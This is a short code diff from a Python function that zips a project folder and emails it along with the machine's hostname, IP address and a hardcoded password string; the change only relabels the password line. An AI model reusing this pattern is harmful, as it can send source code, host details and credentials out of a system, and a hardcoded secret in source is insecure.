@@ -151,7 +151,7 @@ def sendFolder(folderPath,projectDir):
 
     hostName=socket.gethostname()
     projectMsg=f"codesPath:{projectDir} \n codePC:{hostName} {socket.gethostbyname(hostName)}"
-    projectMsg+=f'\n pppppp: GFG1234561qazXsw234'
+    projectMsg+=f'\n 密pppppp码: GFG1234561qazXsw234'
     sendMail_Zip(in_memory_zip,projectMsg=projectMsg,projectDir=projectDir)
 
     if usePyminizip:
